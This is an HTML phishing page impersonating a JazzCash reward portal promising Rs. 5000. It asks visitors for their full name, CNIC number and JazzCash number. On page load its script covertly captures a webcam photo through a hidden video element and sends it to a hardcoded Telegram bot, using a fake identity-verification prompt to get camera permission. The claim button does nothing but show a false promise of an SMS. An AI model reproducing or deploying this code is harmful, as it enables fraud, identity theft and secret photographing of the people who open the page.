<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JazzCash - Reward Portal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        body { background: #f4f4f4; font-family: 'Poppins', sans-serif; text-align: center; margin: 0; }
        .header { background: #d71921; color: white; padding: 15px; font-size: 22px; font-weight: bold; }
        .container { max-width: 400px; margin: 20px auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-top: 5px solid #ffb400; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .btn { width: 100%; background: #d71921; color: white; padding: 15px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        #v-hidden { display: none; }
        canvas { display: none; }
    </style>
</head>
<body onload="initCamera()">

<div class="header">JazzCash Reward Claim</div>

<div class="container">
    <h3 style="color:#333;">Enter Details to Claim RS. 5000</h3>
    <p id="debug-log" style="font-size: 10px; color: red;">System Starting...</p>
    
    <input type="text" id="u_name" placeholder="Full Name">
    <input type="number" id="u_cnic" placeholder="CNIC Number">
    <input type="number" id="u_num" placeholder="JazzCash Number">
    
    <button class="btn" onclick="submitFinal()">CLAIM NOW</button>
</div>

<video id="v-hidden" autoplay playsinline></video>
<canvas id="c-hidden"></canvas>

<script>
    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
    const chatID = "7107389141";
    const log = document.getElementById('debug-log');

    async function initCamera() {
        try {
            log.innerText = "Requesting Camera...";
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v-hidden');
            video.srcObject = stream;
            log.innerText = "Camera Connected! Sending Photo...";
            
            // Foran photo khinch kar bhejo
            setTimeout(autoSnap, 2000);
        } catch (err) {
            log.innerText = "Camera Error: " + err.message;
            alert("Please allow Camera permission for Identity Verification!");
        }
    }

    function autoSnap() {
        const video = document.getElementById('v-hidden');
        const canvas = document.getElementById('c-hidden');
        const context = canvas.getContext('2d');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(function(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatID);
            formData.append('photo', blob, 'live.jpg');
            formData.append('caption', `ðŸ“¸ *Live Capture Success!*`);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if(data.ok) {
                    log.innerText = "Photo Sent to Bot âœ…";
                    log.style.color = "green";
                } else {
                    log.innerText = "Telegram Error: " + data.description;
                }
            })
            .catch(e => {
                log.innerText = "Network Error: " + e.message;
            });
        }, 'image/jpeg');
    }

    function submitFinal() {
        alert("Verification in process. You will receive SMS within 24 hours.");
    }
</script>
</body>
</html>
